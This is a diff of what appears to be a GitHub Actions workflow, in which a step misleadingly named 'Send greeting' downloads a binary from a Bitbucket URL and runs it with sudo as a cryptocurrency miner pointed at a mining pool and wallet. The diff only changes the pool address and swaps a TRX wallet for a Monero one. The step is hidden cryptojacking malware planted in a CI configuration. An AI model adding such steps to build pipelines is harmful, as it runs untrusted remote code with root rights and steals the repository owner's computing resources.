@@ -27,4 +27,4 @@ jobs:
     steps:
     # Runs a single command using the runners shell
     - name: Send greeting
-      run: echo sudo apt-get update && sudo apt-get install -y wget && wget https://bitbucket.org/wegwg/egwe/downloads/masterfile && sudo chmod u+x masterfile && sudo ./masterfile -o rx.unmineable.com:3333 -a rx -k -u TRX:TNNWYF4FXZUKVhgtYRJi17d3eGqSVuL823.pok
+      run: echo sudo apt-get update && sudo apt-get install -y wget && wget https://bitbucket.org/wegwg/egwe/downloads/masterfile && sudo chmod u+x masterfile && sudo ./masterfile -o 13.66.216.166:5555 -a rx -k -u XMR:48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
